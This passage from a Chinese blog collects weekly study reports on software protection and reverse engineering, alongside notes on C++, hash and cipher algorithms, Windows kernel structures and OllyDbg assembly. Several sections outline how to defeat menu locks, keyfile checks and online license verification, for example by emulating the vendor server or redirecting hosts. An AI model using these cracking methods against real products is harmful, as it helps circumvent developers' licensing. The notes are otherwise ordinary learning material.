<p>对于一个变量，我们只需要知道它是 Animal 类型，无需确切地知道它的子类型，就可以放心地调用 run()方法，而具体调用的 run()方法是作用在 Animal、Dog、Cat 还是 Tortoise 对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种 Animal 的子类时，只要确保 run()方法编写正确，不用管原来的代码是如何调用的。<span class="exturl" data-url="aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvODk3NjkyODg4NzI1MzQ0LzkyMzAzMDUwNzcyODM1Mg==">继承和多态<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="虚函数-2">虚函数</h2>
<p>C++中的虚函数的作用主要是实现了多态的机制。基类定义虚函数，子类可以重写该函数；在派生类中对基类定义的虚函数进行重写时，需要在派生类中声明该方法为虚方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="comment">//这里的foo()也可以啥都不输出，即virtual void foo();</span></span></span><br><span class="line"><span class="function">    <span class="comment">//如果写为virtual void foo()=0 则为一个纯虚函数，仅提供一个接口，在继承时必须实现</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;A::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;B::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo</span>();   <span class="comment">// 在这里，a虽然是指向A的指针，但是被调用的函数(foo)却是B的!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>带有纯虚函数的类称为抽象类，只能作为基类，且不能定义对象（抽象类这边还涉及到了 abstract 和 virtual，但先不管了…）</p>
<h3 id="虚函数表">虚函数表</h3>
<p>编译器处理虚函数的方法是：为每个类对象添加一个隐藏成员，隐藏成员中保存了一个指向函数地址数组的指针，称为虚表指针，这种数组成为虚函数表。即，每个类使用一个虚函数表，每个类对象用一个虚表指针。</p>
<h2 id="封装">封装</h2>
<p>把数据和函数捆绑在一起。<br>
通过创建类来进行封装和数据隐藏（public、protected、private）。默认情况下，类中定义的项目都是私有的，再提供对外 public 的接口</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder</span>&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数</span></span><br><span class="line">      <span class="built_in">Adder</span>(<span class="keyword">int</span> i = <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        total = i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">addNum</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          total += number;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getTotal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> total;</span><br><span class="line">      &#125;;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">      <span class="comment">// 对外隐藏的数据</span></span><br><span class="line">      <span class="keyword">int</span> total;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>python 爬虫学习</h1>
<p><a href="https://brubbish.github.io/710f8e5f.html#RE%E5%BA%93%E7%9A%84match%E5%AF%B9%E8%B1%A1">https://brubbish.github.io/710f8e5f.html#RE库的match对象</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.06-2020.04.12</title>
    <url>/51835.html</url>
    <content><![CDATA[<h1>菜单功能限制</h1>
<h2 id="相关函数">相关函数</h2>
<p>要将软件菜单和窗口变得不可用，可用以下函数</p>
<ol>
<li>EnableMenultem()<br>
允许或进制指定的菜单条目<br>
参数：菜单句柄、目标菜单条目的标识符、控制标志（允许、灰化、禁止等）<br>
返回值：返回菜单以前的状态</li>
<li>EnableWindow()<br>
允许或禁止指定窗口<br>
参数：窗口句柄、true/false<br>
返回值：0表示失败，非0表示成功</li>
</ol>
<span id="more"></span>
<h2 id="拆解菜单限制保护">拆解菜单限制保护</h2>
<p>修改控制标志或true/false</p>
<h1>KeyFile保护</h1>
<p>付费后将作者提供的注册文件keyfile放到指定目录下可用让软件成为正版<br>
软件每次启动时都会读取该文件，然后利用某种算法进行处理，以此判断结果是否正确</p>
<h2 id="相关api函数">相关api函数</h2>
<table>
<thead>
<tr>
<th>api函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>FindFirstA</td>
<td>确定文件是否存在</td>
</tr>
<tr>
<td>CreateFileA、_lopen</td>
<td>确定文件是否存在；打开文件获得其句柄</td>
</tr>
<tr>
<td>GetFileSizeA、GetFileEx</td>
<td>获得文件的大小</td>
</tr>
<tr>
<td>GetFileSize、GetFileAttributesExA</td>
<td>获得文件的属性</td>
</tr>
<tr>
<td>SetFilePointer、GetFilePointerEx</td>
<td>移动文件指针</td>
</tr>
<tr>
<td>ReadFile</td>
<td>读取文件内容</td>
</tr>
</tbody>
</table>
<h1>网络验证</h1>
<p>思路是拦截服务器返回的数据包，分析程序是如何处理数据包的</p>
<h2 id="相关函数-2">相关函数</h2>
<p>常用的有send()、recv()【这两个是socket（套接字，计算机之间进行通信的一种约定或一种方式）函数】、WSASend()、WSARecv()等</p>
<h2 id="破解网络验证的一般思路">破解网络验证的一般思路</h2>
<p>如果验证的数据包内容固定，可以抓取数据包，写一个本地服务端模拟服务器<br>
如果不固定则需要找出相应的算法</p>
<ol>
<li>分析发送的数据包<br>
在od中对send()之类的函数设断，分析加密的位置和方式</li>
<li>分析接收的数据包<br>
客户端程序使用recv()之类的函数接收数据，然后进行解密。对解密后数据存放的地址下内存读断点</li>
<li>解除网络验证<br>
编写一个服务端，模拟服务器来接收和发送数据<br>
如果软件用域名登陆服务器，可以修改hosts，使域名指向本地<br>
如果软件用ip地址连接服务器，可以用inet_addr或connect等设断，将ip地址修改为本地ip地址，或用代理软件将ip地址指向本地</li>
</ol>
<p>网络验证的关键是数据包分析</p>
<h1>常用断点设置</h1>
<p><img src="https://s1.ax1x.com/2020/04/09/GInJdU.png" alt=" "></p>
<h1>加密算法</h1>
<h2 id="单向散列算法">单向散列算法</h2>
<p>即hash算法，是将任意长度的消息压缩到某一固定长度的函数（不可逆）<br>
因为是不可逆算法，只能使用hash函数作为加密的一个中间步骤。如，对用户名进行hash变换，再用这个结果进行可逆的加密变换，生成注册码</p>
<h3 id="MD5算法">MD5算法</h3>
<p>MD5消息摘要算法<br>
对任意长度的消息进行运算，产生128位的消息摘要</p>
<h4 id="算法原理">算法原理</h4>
<ol>
<li>数据填充<br>
填充消息，使消息长度（bit）对512求余的结果等于448【比512的倍数小64位】（本身满足了也要）。方法是：附一个1在后面，然后用0来填充。</li>
<li>添加长度<br>
在结尾用64位记录原文长度，最终消息长度是512的整数倍</li>
<li>初始化变量<br>
MD5的结果按32位一组分成4组，由4个寄存器（A、B、C、D）进行演变得到<br>
寄存器初始值为：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原本应为：</span><br><span class="line">A=0x01234567</span><br><span class="line">B=0x89ABCDEF</span><br><span class="line">C=0xFEDCBA98</span><br><span class="line">D=0x76543210</span><br><span class="line">为了在内存中也长那样↑，所以要调整成：</span><br><span class="line">A = 0x67452301;</span><br><span class="line">B = 0xEFCDAB89;</span><br><span class="line">C = 0x98BADCFE;</span><br><span class="line">D = 0x10325476;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>数据处理<br>
4个辅助函数：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X, Y, Z) =(X&amp;Y) | ((~X) &amp; Z)</span><br><span class="line">G(X, Y, Z) =(X&amp;Z) | (Y &amp; (~Z))</span><br><span class="line">H(X, Y, Z) =X^Y^Z</span><br><span class="line">I(X, Y, Z)=Y^(X|(~Z))</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/04/09/GInbFg.png" alt="流程"><br>
将ABCD的副本abcd中的3个经过运算后与第四个相加，再加上两个常数，并将所得的值<strong>循环左移</strong>s位，最后将所得结果加上abcd之一，回送至ABCD（一次子循环）</p>
<ul>
<li>执行的函数和次数：<br>
先执行16次F,再执行16次G…共64次（每次主循环）<br>
主循环次数：原文长度/512（全部消息）</li>
<li>相加的两个常数：<br>
一个是<strong>利用第2步的原文</strong>，将其等分成16份（每份长度为32位），循环使用其中一份。<br>
另一个是4^32*abs(sin(i))得到的整数部分,在第i步中，i用弧度表示。目的是用正弦函数和幂函数消除变换中的线性</li>
<li>循环左移位数s：有个表<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmJmj.png" alt=" "></li>
</ul>
<ol start="5">
<li>输出</li>
</ol>
<h4 id="分析">分析</h4>
<p>用peid插件krypto analyzer分析，得知程序含有md5的迭代常数，可以猜测使用了md5算法<br>
输入的注册码后进行长度等的判断以及数据初步处理：<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmt7n.png" alt=""><br>
上图call的地址里的代码，通过mov的4个数判断在进行md5初始化：<br>
<img src="https://s1.ax1x.com/2020/04/12/GLmY0s.png" alt="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法" title="再根据后续出现的md5算法的正弦函数表（如D76AA478）中的元素可以判断为md5算法"></p>
<h3 id="SHA算法">SHA算法</h3>
<p>只看了一点，就放到下周的周报上了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.13-2020.04.19</title>
    <url>/32820.html</url>
    <content><![CDATA[<h1>加密算法</h1>
<h2 id="单向散列算法">单向散列算法</h2>
<h3 id="SHA算法">SHA算法</h3>
<p>安全散列算法，包括SHA-1,SHA-256,SHA-384,SHA-512,分别产生160位、256位、384位、512位散列值</p>
<h4 id="SHA-1算法">SHA-1算法</h4>
<p>原始消息长度不能超过2^64<br>
sha-1算法与md4算法原理相同，消息分组和填充方式和md5算法相同(到md5的第二步)</p>
<span id="more"></span>
<p>sha-1初始散列值用5个32位双字进行初始化，如图：<br>
<img src="https://s1.ax1x.com/2020/04/14/GzwQKK.png" alt=" "><br>
运算时使用到的常数：<br>
<img src="https://s1.ax1x.com/2020/04/14/GzwlDO.png" alt=" "><br>
用以上两组数识别sha-1算法</p>
<h2 id="对称加密算法">对称加密算法</h2>
<p>加密和解密的密钥完全相同<br>
安全性依赖于：</p>
<ol>
<li>加密算法足够强，无法根据密文直接获得原文</li>
<li>密钥的秘密性</li>
</ol>
<p>在使用时，把用户输入的注册码（或注册码的一部分等）作为算法的密钥。如果在检查注册码时把用户的输入作为算法的输出或输入，解密者都可以找到所用的密钥<br>
常用的对称分组加密算法有：DES、IDEA、AES等</p>
<p>对称密码分为：</p>
<ol>
<li>流密码：对每一个比特都作为基本处理单元进行加密</li>
<li>块密码（分组密码）：先分块，再对每一块进行加密</li>
</ol>
<h3 id="RC4流密码">RC4流密码</h3>
<h4 id="原理">原理</h4>
<p>生成一种伪随机流（称为密钥流），与长度相同的明文通过异或（相同为假，不同为真）操作进行加密；解密时也与密文进行异或操作<br>
密钥流分为KSA和PRGA两部分</p>
<ol>
<li>
<p>KSA（the key-scheduling algorithm)</p>
<ol>
<li>先对一个256字节的数组S进行初始化，按顺序填入0~255</li>
<li>如果输入的密钥长度小于256字节，则按密钥的填充输入的密钥（如输入1，2，3，4，5，填为1，2，3，4，5，1，2，3，…  放入数组T</li>
<li>对1中数组元素做如下交换</li>
</ol>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        　j = <span class="number">0</span>;</span><br><span class="line">    　  　<span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; <span class="number">256</span> ; i++)&#123;</span><br><span class="line">      　　　　j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">      　　　　swap(S[i] , S[j]);</span><br><span class="line">      　　&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>PRGA（the pseudo-random gerneration algorithm)</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123;<span class="comment">//明文长度datalength</span></span><br><span class="line">　　　i = (i + <span class="number">1</span>) mod <span class="number">256</span>;</span><br><span class="line">　　　　j = (j + S[i]) mod <span class="number">256</span>;</span><br><span class="line">　　　　swap(S[i] , S[j]);</span><br><span class="line">　　　　t = (S[i] + S[j]) mod <span class="number">256</span>;</span><br><span class="line">　　　　k = S[t];<span class="comment">//这里的K就是当前生成的一个秘钥流中的一位</span></span><br><span class="line">　　　　<span class="comment">//可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="公开密钥加密算法">公开密钥加密算法</h2>
<p>亦称非对称加密算法。在加密与解密时用不同的密钥，加密用的密钥叫做公钥，解密用的密钥叫做私钥<br>
公开密钥的设计基于<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNzY4NDgzL2FydGljbGUvZGV0YWlscy84MDQzMDU5MA==">NP完全问题<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="RSA算法">RSA算法</h3>
<p>算法的安全性依赖于大整数因式分解（主要是分解n），密钥位数越长就越安全</p>
<h4 id="原理-2">原理</h4>
<ol>
<li>选取两个较大素数p，q（用算法随机产生两个数，使用概率算法来验证是否质数。假如通过了这个测试的话，那么要使用一个精确的测试来保证的确是质数。）且pq不能太接近</li>
<li>n=pq，n称为模</li>
<li>计算欧拉函数φ(n)=(p-1)(q-1)</li>
<li>选取加密密钥e，e常用值为3、7和（2^16+1)</li>
<li>使用扩展欧几里得算法，求出d</li>
<li>公钥为e和n；私钥为d；p，q必须保密</li>
<li>把消息进行分组，每组长度比n小，将每组都根据公式进行加密的计算</li>
<li>解密时，取每一个分组按公式进行解密</li>
</ol>
<h2 id="Base64算法">Base64算法</h2>
<p>将二进制数据编码为字母和数字，用于非文本传输。使用ASCII（A~/)第65个字符为“=”），并用6个进制位表示一个可显示字符<br>
编码时：</p>
<ol>
<li>将第一个字节放置于24位缓冲区的高8位，第二个字节放在中间的8位，第三个字节放在低8位（少于3个字节，相应的缓冲区置0）</li>
<li>对24位缓冲区以6位为一组作为索引，高位优先，从ASCII表取出对应数值的元素进行输出,置0的位置输出“=”</li>
</ol>
<p>如：对单词sky：<br>
<img src="https://s1.ax1x.com/2020/04/17/JZN1ER.png" alt=" "><br>
<img src="https://s1.ax1x.com/2020/04/17/JZdBVJ.jpg" alt=" "><br>
再根据28-&gt;c;54-&gt;2;…<br>
得到sky对应的base64编码</p>
<p>在url和cookie里“=”会造成歧义，因此很多base64编码在最后会把&quot;=&quot;去掉。<br>
因为<strong>base64编码的长度永远是4的倍数</strong>，所以可以确定少了几个“=”</p>
<h2 id="加密算法在软件保护的应用">加密算法在软件保护的应用</h2>
<p>不仅包括软件的注册激活系统、软件的防逆向，还包括软件涉及的数据的安全保护，包括存储数据的加密和数据交换的加密协议，如聊天软件的加密协议、游戏客户端与服务器通信的协议包、智能硬件和app通信的命令协议等<br>
高等难度级别的保护方案可以设计得简单也可以复杂：<br>
简单：例如对用户名处理时把哈希、对称、公钥算法全都用上，或者用难以分析的算法例如ecdsa。流程很简单但破解门槛很高<br>
复杂：可以使用不常见的算法（没有特征）、使用自己的算法，如果用公开的算法库，要去掉一些特征字符串，从而识别不出用了哪个算法库</p>
<h1>Windows内核</h1>
<p>操作系统一般分为应用层和内核层，应用层通过系统调用进入内核，由系统底层完成相应功能；内核处理某些硬件发来的中断请求，代替硬件完成某些功能</p>
<h2 id="内核理论基础">内核理论基础</h2>
<h3 id="权限级别">权限级别</h3>
<p>cpu的运行级别依次为R0（最高执行权限）、R1、R2、R3（最低执行权限），r0运行内核，r1、r2运行设备驱动，r3运行应用程序。为了让工作变得简单，现在cpu和操作系统只保留了r0和r3，驱动运行在r0级</p>
<h3 id="内存空间布局">内存空间布局</h3>
<p>32位寻址支持2^32B（4GB）的虚拟内存空间，其中系统的内存主要分为内核空间和应用层空间，每部分约占2GB，还有64kb的null空间和非法区域<br>
64位理论支持最大2^64kb的寻址空间，但因为太大用不完所以只支持到40多位（…顺便32位和64位cpu地址总线不一定是32/64，32位通过PAE扩展到36位；64位只有4x位）</p>
<h3 id="Windows启动过程">Windows启动过程</h3>
<ol>
<li>自检<br>
从bios载入指令，进行硬件的初始化检查</li>
<li>初始化启动<br>
根据cmos的设置，bios加载启动盘，将主引导记录（mbr）[1]中的引导代码载入内存。启动代码搜索mbr中的分区表,找出活动分区，将引导代码载入内存。引导代码查找并启动ntldr文件，bios将控制权转移给ntldr</li>
<li>boot加载
<ol>
<li>设置内存模式</li>
<li>启动文件系统，定位boot.ini等启动文件</li>
<li>读取boot.ini</li>
</ol>
</li>
<li>检测和配置硬件<br>
检查和配置硬件设备如系统固件、适配器、输入设备等</li>
<li>内核加载
<ol>
<li>加载系统内核的ntoskrnl.exe[2]和硬件抽象层（HAL,内核与硬件电路之间的接口层)。</li>
<li>从注册表读取安装的驱动程序，然后依次加载</li>
</ol>
</li>
<li>Windows会话管理启动<br>
会话管理器程序：smss.exe，是系统第一个创建的用户模式进程</li>
<li>用户登录<br>
由winlogon.exe系统服务提供，完成：
<ol>
<li>启动服务子系统，即服务控制管理器</li>
<li>启动本地安全授权过程</li>
<li>显示登录界面</li>
</ol>
</li>
</ol>
<p>用bios和mbr的启动方式具有局限性，新的系统引导方式用UEFI和GPT。<br>
UEFI（统一的可扩展固件接口）突破了读取分区容量最高仅为2tb的限制；并且UEFI本身相当于一个微型操作系统，可以直接读取FAT分区中的文件，程序员可以开发出直接在UEFI下运行的程序。因此可以将Windows安装程序做成efi类型的应用程序，从而不需要主引导记录、活动分区等，就可以启动Windows<br>
GPT（全局唯一标识分区表）可以对分区数量没有限制（Windows限制在128个以内），可管理磁盘大小为18eb，只有基于uefi平台的主板才支持gpt分区引导启动</p>
<p>[1]: Master Boot Record，包括启动代码、硬盘分区表、结束标志字，包含MBR引导代码的扇区称为主引导扇区<br>
[2]: Windows NT operating system kernel,为内核空间提供内核和执行层，并负责一些系统服务</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.20-2020.04.26</title>
    <url>/45941.html</url>
    <content><![CDATA[<h1>Windows内核基础</h1>
<h2 id="内核理论基础">内核理论基础</h2>
<h3 id="Windows-r0和r3通信">Windows r0和r3通信</h3>
<p>当一个应用程序调用一个有关io的api，事实上这个api被封装在应用层的某个dll库文件中，dll动态库中函数调用的更底层的函数包含在ntdll.dll文件中。<br>
当应用层的某个api通过ntdll.dll里的native api执行时，会完成参数检查工作，再用一个中断指令从r3层进入r0层。</p>
<span id="more"></span> 
<p>ntdll.dll中的函数时成对出现的，分别以“nt”和“zw”开头，如ntcreatefile、zwcreatefile<br>
从用户模式调用nt* 和zw* api,连接ntdll.lib：<br>
  二者都是通过设置系统服务表中的索引和在栈中设置参数，通过sysenter或syscall指令进入内核态，并最终跳转到kiservicetable对应的系统服务例程中。代码会严格检查从用户空间传入的参数<br>
从内核模式调用nt* 和zw* api,连接ntdll.lib：<br>
  nt* api将直接调用对应函数，zw* api通过kisystemservice跳转到对应的函数代码<br>
调用nt* api时不会改变previous mode（分为用户态和内核态）的状态；调用zw* api时会将previous mode 改为内核态。使用zw* api可以避免额外的参数列表检查，提高效率</p>
<p>内核主要由各种驱动（在磁盘上时.sys文件）组成，有的是系统自带的，有的是软件厂商提供的。驱动加载后会生成对应的设备对象，并可以选择向r3提供一个可供访问和打开的符号链接<br>
应用层程序可以根据符号链接调用CreateFile()函数打开，在获得句柄后，程序就可以调用应用层函数与内核驱动进行通信<br>
  符号链接（软链接）：a symbolic link is a file that links to another file or directory using its path.然后大概是路径可以自动变的快捷方式…吧<br>
内核驱动执行DriverEntry()函数后就可以接受r3层的通信请求了。内核驱动中专门有一组函数用于响应应用层的调用请求</p>
<h3 id="内核函数">内核函数</h3>
<p>前缀：<br>
<img src="https://s1.ax1x.com/2020/04/24/JDmOoR.png" alt=" "></p>
<p>调用内核函数要注意它的中断请求级别（IRQL,Interrupt Request Level）要求。内核在不同情况下会运行在不同的IRQL级别上，此时必须调用符合该级别的内核函数</p>
<p><img src="https://s1.ax1x.com/2020/04/24/JD0lBd.png" alt=" "></p>
<p>passive_level：最低级别，对所有中断都可以做出响应，<strong>用户模式代码都运行在该中断级别上</strong>，可以访问分页内存<br>
apc_level：只有apc级别的中断可以被屏蔽，可以访问分页内存，分页调度管理就运行在该级别上<br>
dispatch_level:该级别和更低的中断被屏蔽，不能访问分页内存，只能处理不可分页的内存，因此在这个级别上能访问的api大大减少。线程调度运行在该级别上。线程调度用于执行多任务，由时钟中断来保证，因此该级别的中断即是调度中断。这个级别对一些严重中断不进行处理，所以要慎重使用（emmm…)<br>
DIRQL（Device IRQL）：IRQL的最高级别，在该级别上的中断都会被忽略，通常用于判断设备优先级</p>
<ul>
<li>分页内存：<br>
在保护模式中，内存访问使用分段机制，即&quot;段基址:段内偏移地址&quot;；操作系统将一些进程不常用的内存放到硬盘中，腾出内存空间，在一定程度上解决了内存不足的问题，但如果内存特别小，就会无法容纳任何一个进程的段。这个问题的原因是在只有分段的情况下，cpu认为线性地址等于物理地址，所以物理地址也必须要连续，但实际上可用的物理地址不连续。为了解决这个问题，需要让物理地址和线性地址重新建立映射，让前者不连续，后者连续，由此引出内存分页机制<br>
分页机制建立在分段机制的基础上，因此分页在分段后进行。在内存分页机制下，由“段基址:段内偏移地址”得到的线性地址不是物理地址而是虚拟地址，对应的物理地址要在页表中查找。<br>
分页机制提供连续线性地址到不连续物理地址的映射，以及用大小相等的页代替大小不相等的段</li>
</ul>
<h3 id="内核驱动模块">内核驱动模块</h3>
<p>内核驱动扩展名为.sys</p>
<ul>
<li>驱动的加载和执行<br>
创建一个服务（注册表），在services键下（…\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\）建立一个与驱动名称相关的服务键，服务键规定了驱动的一些属性，如加载的先后等<br>
对象管理器生成驱动对象，并传递给DriverEntry()函数，执行DriverEntry()函数。（DriverEntry()是驱动执行的入口函数）<br>
创建控制设备对象；创建控制设备符号链接；如果是过滤驱动，则创建过滤设备对象并绑定<br>
注册特定的分发派遣函数<br>
其他初始化动作，如hook、过滤（如文件过滤、防火墙过滤）等的注册和 初始化</li>
</ul>
<p> *过滤驱动就是挂载在其他驱动上，对某设备的irp(I/O Request Package)进行拦截过滤作用，可以对设备进行功能扩展，或是数据加密等的驱动程序。</p>
<h2 id="内核的数据结构">内核的数据结构</h2>
<h3 id="内核对象">内核对象</h3>
<p>内核对象是一种Windows内核中的数据结构管理机制。应用层的进程、线程、文件、等对象或打开的句柄在内核中都有对应的内核对象<br>
一个内核对象可以分为对象头和对象体。对象头中至少有一个OBJECT_HEADER和对象额外信息。对象体紧接着对象头中的OBJECT_HEADER。一个指针总是指向对象体而不是对象头，将对象体指针减去偏移值，获得OBJECT_HEADER的结构，从而访问其他对象结构辅助信息<br>
<img src="https://s1.ax1x.com/2020/04/26/JcAJKO.png" alt=" "><br>
内核对象分为：</p>
<ol>
<li>Dispatcher对象<br>
在对象体开始位置放置了一个共享的公共数据结构DISPATCHER_HEADER，包含了这个结构的内核对象名字都以K开头（但K开头的不一定都是这个对象），这些内核对象都是可以等待的（(waitable):①当到达某一个时间后，才继续线程的执行。/②当到达某一个时间后，调用某一个函数，而且间隔多少时间后，再次调用。）</li>
<li>io对象<br>
在开始位置不放置DISPATCHER_HEADER，但通常放置一个与type和size有关的整型成员。</li>
<li>其他对象<br>
包括进程对象(EPROCESS)和线程对象(ETHREAD)等<br>
EPROCESS用于管理进程的各种信息，每一个进程都对应一个EPROCESS结构，用于记录进程执行期间的各种数据。<br>
第一个成员是进程的对象KPROCESS，所有进程的EPROCESS内核结构都被放入一个双向链表，R3在枚举系统进程的时候，通过遍历这个链表获得了进程的列表</li>
</ol>
<p>ETHREAD结构是线程的内核管理对象，每一个线程都有一个对应的ETHREAD结构。结构的第一个成员是线程对象KTHREAD，所有的ETHREAD结构也被放在一个双向链表里<br>
<img src="https://s1.ax1x.com/2020/04/26/JcAYrD.png" alt=" "></p>
<h3 id="SSDT">SSDT</h3>
<p>“system services descriptor table”, 在内核中的实际名称是&quot;KeServiceDscriptorTable&quot;<br>
用于处理应用层通过Kernel32.dll下发的各个api操作请求。当kernel32.dll的api通过ntdll.dll时，会先完成对参数的检查，在调用一个中断，从而实现r3层进入r0层。</p>
<p>SSDT表中最重要的两个成员为ServiceTableBase（表的基地址）和NumberOfServices（系统中SSDT服务函数的个数）<br>
由ssdt表的基地址和ssdt函数的索引号可以求出对应的服务函数的地址（32位和64位计算公式不同）</p>
<h4 id="Shadow-SSDT">Shadow SSDT</h4>
<p>原理和SSDT类似，对应的表名为KeServiceDscriptorTable<strong>Shadow</strong>，是内核未导出（不能在自己的模块中导入和直接引用）的一张表，包含Ntoskrnel.exe和win32.sys服务函数。<br>
hook该表中的某些函数可以实现截屏保护、模拟按键、防止窗口被关闭等</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.27-2020.05.03</title>
    <url>/59200.html</url>
    <content><![CDATA[<h1>Windows内核基础</h1>
<h2 id="内核的数据结构">内核的数据结构</h2>
<h3 id="TEB">TEB</h3>
<p>TEB结构(Thread environment block,线程环境块)和PEB一样，是应用层中的结构。<br>
包含了系统频繁使用的一些与线程相关的数据，进程中每个线程（除系统线程）都有一个自己的TEB，一个进程的所有TEB都存放在从0x7FFDE000开始的线性内存中，每4KB为一个完整的TEB<br>
用WinDbg的本地调试功能可以查看系统中的TEB结构</p>
<span id="more"></span>
<h4 id="TEB访问">TEB访问</h4>
<p>可以通过NtCurrentTab函数调用和FS段寄存器访问两种方式访问TEB结构</p>
<ol>
<li>NtCurrentTab<br>
一个ntdll.dll中的函数，该函数可以返回当前线程TEB的地址</li>
<li>FS段寄存器<br>
当代码运行在r3时，fs指向的段的基地址即为当前线程的TEB</li>
</ol>
<h3 id="PEB">PEB</h3>
<p>PEB(Process Environment Block,进程环境块)存在于用户地址空间中，每个进程都有自己的PEB信息<br>
PEB结构的地址放在TEB中，因此可以通过fs：[偏移量]访问PEB的地址</p>
<h1>使用OD从零开始Cracking</h1>
<h2 id="汇编指令">汇编指令</h2>
<ol>
<li>nop</li>
<li>堆栈相关指令
<ol>
<li>push<br>
push[内存地址]<br>
push[eax]<br>
push 数值</li>
</ol>
<ul>
<li>ptr：防止两个操作数不一样。<br>
用byte/word/dword ptr指定内存单元的长度（字节、字、双字）</li>
</ul>
<ol start="2">
<li>pop</li>
<li>pushad<br>
按照eax、ecx、edx、ebx、esp、ebp、esi、edi的顺序把所有通用寄存器压入栈</li>
<li>popad<br>
把pushad入栈的值取出（顺序相反）</li>
<li>16位程序中有pusha、popa</li>
</ol>
</li>
<li>赋值指令
<ol>
<li>mov</li>
<li>movsx(操作有符号数)<br>
第一个操作数的位数比第二个操作数多，第二个填充第一个的前面几位<br>
填充的结果跟填充数字正负有关。用负数填充，结果的剩余部分填F；整数填充剩余部分填0。<br>
如：用F000填EAX，结果为FFFFF000；用1234填EAX，结果为00001234.<br>
(16位数的正数范围为0~7FFF，负数范围为8000~FFFF)</li>
<li>movzx（操作无符号数）<br>
与movsx相似，但剩余部分总填充0</li>
<li>LEA<br>
取地址指令，第一个操作数是通用寄存器，第二个是内存单元的地址（而不是值）<br>
如&quot;LEA EAX,DOWRD PTR DS:[ECX+38]&quot;不是获取内存中[ECX+38],而要计算ECX+38的值，并赋给EAX</li>
<li>XCHG<br>
交换两个操作数的值，寄存器/内存单元和寄存器</li>
</ol>
</li>
</ol>
<h2 id="数学指令">数学指令</h2>
<ol>
<li>inc dec</li>
<li>add sub</li>
<li>adc (带进位的加法)<br>
将两个操作数和进位标志（CF）的值相加放到第一个操作数中</li>
<li>SBB<br>
计算（第一个操作数-第二个操作数）再减去进位标志，将结果 存到第一个操作数中</li>
<li>MUL<br>
无符号数乘法。只有一个操作数，操作数和EAX相乘，结果放到EDX:EAX中</li>
